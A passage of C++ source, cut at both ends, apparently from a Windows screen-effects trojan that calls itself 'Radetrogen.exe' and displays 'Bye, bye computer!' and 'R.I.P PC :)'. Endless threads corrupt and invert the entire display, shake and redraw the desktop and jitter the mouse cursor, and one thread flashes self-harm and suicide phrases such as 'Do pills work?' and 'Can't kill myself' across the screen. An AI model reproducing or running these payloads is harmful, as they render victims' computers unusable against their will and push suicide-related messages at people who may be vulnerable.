		PlgBlt(deskMen, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		wPt[0].x = wRect.left - 10;
		wPt[0].y = wRect.bottom + 10;
		wPt[1].x = wRect.right - 100;
		wPt[1].y = wRect.bottom - 10;
		wPt[2].x = wRect.left + 10;
		wPt[2].y = wRect.top + sw;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(desk, 0, 0, sw, sh, deskMen, 0, 0, 0x8928E28);
		StretchBlt(desk, 0, 0, sw, sh, desk, rand() % sw, rand() % sh, sw, sh, SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, rand() % sw, 0 - rand() % sh, sw, sh, SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, 0 - rand() % sw, rand() % sh, sw, sh, SRCPAINT);
		StretchBlt(desk, 0, 0, sw, sh, desk, 0 - rand() % sw, 0 - rand() % sh, sw, sh, SRCPAINT);
		Sleep(10);
		if (rand() % 20 == 0) InvalidateRect(0, 0, 0);
		Sleep(10);
	}
}
DWORD WINAPI effect10(LPVOID lpParam)
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 12, rand() % 12, SRCINVERT);
		Sleep(10);
	}
}
DWORD WINAPI effect2(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		int r1 = rand() % x;
		int r2 = rand() % y;
		HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hbrush);
		StretchBlt(hdc, 0, 0, x, r2, hdc, r1, r2, 1, 1, PATINVERT);
		Sleep(10);
	}

}
DWORD WINAPI plg(LPVOID lpvd)
{
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0;
	int dY = 0;
	int dW;
	int dH;
	POINT wPt[3];
	int counter = 30;

	while (true)
	{
		hWnd = GetDesktopWindow();
		hWindow = GetWindowDC(hWnd);
		hDsktp = GetDC(0);
		GetWindowRect(hWnd, &wRect);

		dW = GetSystemMetrics(0);
		dH = GetSystemMetrics(0);

		wPt[0].x = wRect.left + counter;
		wPt[0].y = wRect.top - counter;
		wPt[1].x = wRect.right + counter;
		wPt[1].y = wRect.top + counter;
		wPt[2].x = wRect.left - counter;
		wPt[2].y = wRect.bottom - counter;

		PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		//if (counter < 15) counter++;
		//if (counter < 65) counter--;
	}
}
DWORD WINAPI effect3(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HWND hwnd = GetDesktopWindow();
	RECT rect;
	while (true)
	{
		GetWindowRect(hwnd, &rect);
		int r = rand() % h;
		int r2 = rand() % 2;
		if (r2 == 0)
		{
			//Sleep(500);
			BitBlt(hdc, 1, r, w, 66, hdc, 0, r, SRCCOPY);
		}
		else if (r2 == 1)
		{
			//Sleep(500);
			BitBlt(hdc, 0, r, w, 66, hdc, 1, r, SRCCOPY);
		}
	}
}
DWORD WINAPI glitch(LPVOID lpvd)
{
	int x, y;
	x = GetSystemMetrics(0);
	y = GetSystemMetrics(1);
	while (0 == 0)
	{
		int randy, randx;
		randx = rand() % x;
		randy = rand() % y;
		BitBlt(GetDC(NULL), rand() % x + 0, rand() % y + 0, randx + 200, randy + 200, GetDC(NULL), randx, randy, NOTSRCCOPY);
		Sleep(10);
	}
}
DWORD WINAPI line(LPVOID lpvd)
{
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);


	HDC desk = GetDC(0);
	int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
	while (1)
	{

		if (rand() % 25 == 9)
		{
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);

			Sleep(50);
		}
		if (rand() % 2 == 1) {

			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(10);

		}
	}
}

DWORD WINAPI cursor(LPVOID LPSTART)
{
	HDC hdcc = GetDC(0);
	CURSORINFO curinf;
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (1)
	{
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		Sleep(10);
	}
}
DWORD WINAPI MOUSEMOVE(LPVOID lpvd)
{
	while (0 == 0)
	{
		POINT mouse;
		int x;
		int y;
		GetCursorPos(&mouse);
		x = mouse.x;
		y = mouse.y;
		srand(getrandom);
		SetCursorPos(x + rand() % 3 + 1, y + rand() % 3 + 1);
		Sleep(10);
		SetCursorPos(x - rand() % 5 + 1, y - rand() % 5 + 1);
		Sleep(10);
	}
}
DWORD WINAPI PatBlt2(LPVOID lpvd)
{
	HDC hdc = 0;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;

	while (1)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, 0, 0, sx, sy, PATINVERT);
		Sleep(10);
	}
}
DWORD WINAPI mirrorr(LPVOID lpvd)
{
	while (true)
	{
		HDC hdc = GetDC(NULL);
		int x, y, l, p;
		x = GetSystemMetrics(SM_CXSCREEN);
		y = GetSystemMetrics(SM_CYSCREEN);
		HWND hwnd = GetDesktopWindow();
		RECT rekt;
		GetWindowRect(hwnd, &rekt);
		l = rand() % x;
		p = rand() % y;
		StretchBlt(hdc, x, y, rekt.left - x, rekt.top - y, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);

		Sleep(10);
	}
}

DWORD WINAPI ellepsy(LPVOID lpvd)
{
	HDC desk = GetDC(0); // получаем HDC экрана
	int xs = GetSystemMetrics(0);//ширина экрана
	int ys = GetSystemMetrics(1);//высота экрана
	while (1)//цикл
	{
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));//делаем кисть то есть цвета
		SelectObject(desk, brush);//делаем кисть работающей
		Ellipse(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys);//функция
		Sleep(10);
	}
}
DWORD WINAPI screendown(LPVOID pnvd)
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, 10, 100, w, h, hdc, 12, 12, SRCCOPY);
		Sleep(10);
	}
}
DWORD WINAPI darkscreen(LPVOID lpvd)
{
	HDC hdc;
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
		Sleep(10);
	}
}
DWORD WINAPI e(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	INT sw = GetSystemMetrics(0);
	INT sh = GetSystemMetrics(1);
	while (true)
	{
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, PATINVERT);
		Sleep(10);
	}
}

DWORD WINAPI memz(LPVOID lpvd)
{
	int a, b;
	while (0 == 0)
	{
		a = GetSystemMetrics(0);
		b = GetSystemMetrics(1);
		StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
		Sleep(10);
	}
}
DWORD WINAPI MoreTextouts(LPVOID lpvd)
{
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	for (;;)
	{
		SetBkMode(desk, 0);
		text = "Radetrogen.exe";
		text1 = "By:_BelkasPRO";
		text2 = "I'll make it alone";
		text3 = "Bye, bye computer!";
		SetTextColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
		SelectObject(desk, font);
		TextOutA(desk, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text3, strlen(text3));
		//Sleep(500);
		DeleteObject(font);
	}
}
DWORD WINAPI woah(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		SetStretchBltMode(hdc, HALFTONE);
		//StretchBlt(hdc, -10, -10, x + 20, y + 20, hdc, 0, 0, x, y, 0x1900ac010e);
		StretchBlt(hdc, rand() % 10, rand() % 10, x - 20, y - 20, hdc, 0, 0, x, y, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI woah2(LPVOID lpvd) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		//BitBlt(hdc, -30, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, rand() % 40 - 20, 0, w, h, hdc, 0, rand() % 40 - 20, 0x1900ac010e);
		//BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, 0x1900ac010e);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader1111(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x ^ 5;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader333(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x ^ y) ^ rand();
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader444(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 10, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -h + 10, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI textout22(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "R.I.P PC :)";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(100);
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

DWORD WINAPI gomuse(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	//Just added a HALFTONE effect
	SetStretchBltMode(dcCopy, HALFTONE);
	SetStretchBltMode(dc, HALFTONE);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = abs(x - (ws / 2));
				int cy = abs(y - (hs / 2));

				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = (zx + i) - (zy + i);

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}

		i++; angle += 0.01f;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

	}

	return 0x00;
}
DWORD WINAPI payload454(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 32;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = x + (ws / 2);
				int cy = y + (hs / 2);

				int zx = (cx * cx);
				int zy = (cy * cy);

				int di = 128.0 + i;

				int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				hsv.h += fmod(fx + i, 360.0);

				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
		Sleep(10);
	}

	return 0x00;
}
DWORD WINAPI payload666(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;

	//semi-major axis and semi-minor axis
	FLOAT a = 5.0;
	FLOAT b = 3.0;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		//Set a random (x,y) pos
		int randx = rand() % ws;
		int randy = rand() % hs;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = x - randx;
				int cy = y - randy;

				//(x²/a²) + (y²+b²) = 1
				int zx = (cx * cx) / (a * a);
				int zy = (cy * cy) / (b * b);

				//Plasma it
				int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

				//Convert the screen colors to HSV
				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				//Apply the effect from fx+i [0,360]
				hsv.h = fmod(fx + i, 360.0);

				//Return the HSV back to RGB and show it
				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
		RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
		Sleep(10);
	}

	return 0x00;
}
DWORD WINAPI payload333(LPVOID lpParam) {
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;

	//semi-major axis and semi-minor axis
	FLOAT a = 5.0;
	FLOAT b = 3.0;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		//Set a random (x,y) pos
		int randx = rand() % ws;
		int randy = rand() % hs;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = x - randx;
				int cy = y - randy;

				//(x²/a²) + (y²+b²) = 1
				int zx = (cx * cx) / (a * a);
				int zy = (cy * cy) / (b * b);

				//Plasma it
				int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

				//Convert the screen colors to HSV
				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				//Apply the effect from fx+i [0,360]
				hsv.h = fmod(fx + i, 360.0);

				//Return the HSV back to RGB and show it
				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

	}

	return 0x00;
}
DWORD WINAPI RandomTexts(LPVOID lpvd)
{
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	LOGFONTW lFont = { 0 };

	//Setup our font style
	lFont.lfWidth = 10;
	lFont.lfHeight = 20;
	lFont.lfOrientation = 200;
	lFont.lfWeight = 400;
	lFont.lfUnderline = TRUE;
	lFont.lfQuality = DRAFT_QUALITY;
	lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;

	lstrcpy(lFont.lfFaceName, L"Times New Roman");

	while (true)
	{
		if (rand() % 25 == 24)
		{
			LPCSTR lpStrings[] =
			{
				"Do pills work?", "I don't want live anymore", "Waiting for my end",
				"Everyday is a infinite loop", "My thoughts are killing me", "Kill me",
				"Dissociating", "Fleeing reality", "Am I Real?", "I'am not safe",
				"HELP ME", "cold.", "Transcending", "Anxiety", "Hear the voices",
				"Trapped by illusion", "Full of emptiness", "Dreaming forever",
				"Questioning my existence", "Losing control regressively", "pain",
				"Don't want to suffer anymore", "Panic attacks", "Dark forever",
				"Faking my happiness", "Seeking eternal peace", "Can't breathe", "sad",
				"Existential Crisis", "Viewing shadows", "Beyond the stars", "Alone",
				"Can't kill myself", "What am I", "Made with rotten flesh", "Isolated",
				"Wearing masks", "My final destination", "Hurting myself", "Farewell"
			};

			//Setup the angle
			lFont.lfEscapement = rand() % 60;

			HFONT hFont = CreateFontIndirectW(&lFont);
			SelectObject(dc, hFont);

			//Setup the colors
			SetTextColor(dc, RGB(rand() % 0xFF, rand() % 0xFF, rand() % 0xFF));
			SetBkColor(dc, RGB(rand() % 0xA0, rand() % 0xA0, rand() % 0xA0));

			int index = rand() % 40;

			TextOutA(dc, rand() % w, rand() % h, lpStrings[index], lstrlenA(lpStrings[index]));

			if (rand() % 25 == 24)
			{
				if (rand() % 2 == 0)
				{
					BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x999999);
				}
				else
				{
					BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x666666);
				}
			}

			Sleep(rand() % 5);

		}
	}

	return 0x00;
}
DWORD WINAPI Tesseract(LPVOID lpvd)
{
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	/*
		   Setup the Tesseract's size
		By your screen's width and height
	*/

	float size = (w + h) / 10;

	int cx = size;
	int cy = size;

	int xdv = 10;
	int ydv = 10;

	float angleX = 0.01;
	float angleY = 0.01;
	float angleZ = 0.01;

	int d = 60;

	VERTEX vtx[] =
	{
		//BOTTOM HYPER CUBE
		{size, 0, 0},
		{size, size, 0},
		{0, size, 0},
		{0, 0, 0},

		//TOP HYPER CUBE
		{size, 0, size},
		{size, size, size},
		{0, size, size},
		{0, 0, size},

		//BOTTOM INSIDE HYPER CUBE
		{size - d,  d,      d},
		{size - d,  size - d,  d},
		{d,      size - d,  d},
		{d,      d,      d},

		//TOP INSIDE HYPER CUBE
		{size - d,  d,      size - d},
		{size - d,  size - d,  size - d},
		{d,      size - d,  size - d},
		{d,      d,      size - d}
	};

	//32 EDGES
	EDGE edges[] =
	{
		//BOTTOM HYPER CUBE FACE (0, 1, 2, 3)
		{0, 1},
		{1, 2},
		{2, 3},
		{3, 0},

		//BOTTOM-TOP HYPER CUBE FACE
		{0, 4},
		{1, 5},
		{2, 6},
		{3, 7},

		//TOP HYPER CUBE FACE (4, 5, 6, 7)
		{4, 5},
		{5, 6},
		{6, 7},
		{7, 4},

		//BOTTOM INSIDE HYPER CUBE FACE (8, 9, 10, 11)
		{8,   9},
		{9,  10},
		{10, 11},
		{11,  8},

		//BOTTOM-TOP INSIDE HYPER CUBE FACE
		{8,  12},
		{9,  13},
		{10, 14},
		{11, 15},

		//TOP INSIDE HYPER CUBE FACE (12, 13, 14, 15)
		{12, 13},
		{13, 14},
		{14, 15},
		{15, 12},

		//HYPER CUBE AND INSIDE CONNECTION BOTTOM
		{0,  8},
		{1,  9},
		{2, 10},
		{3, 11},

		//HYPER CUBE AND INSIDE CONNECTION TOP
		{4, 12},
		{5, 13},
		{6, 14},
		{7, 15}
	};

	LPCWSTR icons[] = { IDI_ERROR, IDI_EXCLAMATION, IDI_ASTERISK, IDI_APPLICATION };

	int index = rand() % 4;

	//Calculate the number of vertex and edges
	int totvtx = sizeof(vtx) / sizeof(vtx[0]);
	int totedg = sizeof(edges) / sizeof(edges[0]);

	while (true)
	{
		//Rotate Axis
		for (int i = 0; i < totvtx; i++)
		{
			_3D::RotateX(&vtx[i], angleX);
			_3D::RotateY(&vtx[i], angleY);
			_3D::RotateZ(&vtx[i], angleZ);
		}

		//Draw the edge
		for (int i = 0; i < totedg; i++)
		{
			_3D::DrawEdge(dc, icons[index],
				vtx[edges[i].vtx0].x + cx, vtx[edges[i].vtx0].y + cy,
				vtx[edges[i].vtx1].x + cx, vtx[edges[i].vtx1].y + cy, 20);
		}

		Sleep(40);
		if (rand() % 5 == 0) ;

		//Moves the tesseract around
		cx += xdv;
		cy += ydv;

		//Right and left collisions
		if (cx > w - (size / 2) || cx < -(size / 2))
		{
			xdv *= -1;
			index = rand() % 4;
		}

		//Top and bottom collisions
		if (cy > h - (size / 2) || cy < -(size / 2))
		{
			ydv *= -1;
			index = rand() % 4;
		}
	}

	return 0x00;
}
namespace System {

	VOID RedrawScreen(VOID) 
	{
		RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
	}
}

VOID WINAPI CircleInvert(int a1, int a2, int a3, int a4)
{
	int v4; // ebx
	int v5; // eax
	int v6; // ebx
	int v7; // eax
	HBRUSH v8; // rax
	HRGN hrgn; // [rsp+58h] [rbp-28h]
	HDC hdc; // [rsp+60h] [rbp-20h]

	hdc = GetDC(0i64);
	hrgn = CreateEllipticRgn(a1, a2, a1 + a3, a4 + a2);
	SelectClipRgn(hdc, hrgn);
	v4 = (unsigned __int8)(rand() % 255);
	v5 = rand();
	v6 = v4 | ((unsigned __int8)(v5 - v5 / -255) << 8);
	v7 = rand();
	v8 = CreateSolidBrush(v6 | ((unsigned __int8)(v7 - v7 / -255) << 16));
	SelectObject(hdc, v8);
	BitBlt(hdc, a1, a2, a3, a4, hdc, a1, a2, 0x2837E28u);
	DeleteObject(hrgn);
	ReleaseDC(0i64, hdc);
}
DWORD WINAPI CircleEF(LPVOID)
{
	HWND v3; // rax
	struct tagRECT Rect; // [rsp+20h] [rbp-30h] BYREF
	int v6; // [rsp+34h] [rbp-1Ch]
	int v7; // [rsp+38h] [rbp-18h]
	int v8; // [rsp+3Ch] [rbp-14h]
	int v9; // [rsp+40h] [rbp-10h]
	int v10; // [rsp+44h] [rbp-Ch]
	int j; // [rsp+48h] [rbp-8h]
	int i; // [rsp+4Ch] [rbp-4h]
	v3 = GetDesktopWindow();
	GetWindowRect(v3, &Rect);
	v10 = Rect.right - Rect.top - 500;
	v9 = Rect.bottom - Rect.top - 500;
	for (i = 0; ; ++i)
	{
		v8 = 1000;
		v7 = rand() % (v10 + 1000) - 500;
		v6 = rand() % (v9 + 1000) - 500;
		for (j = 0; j <= 999; j += 10)
		{
			CircleInvert(j - v7, v6 - v7 / 2, j, j);
			Sleep(0xAu);
			InvalidateRect(0i64, 0i64, 0);
		}
	}
}



DWORD WINAPI CircleR(LPVOID)
{
	void* v3; // esp
	int cy; // ebx
	int v5; // eax
	int v6; // ebx
	int v7; // eax
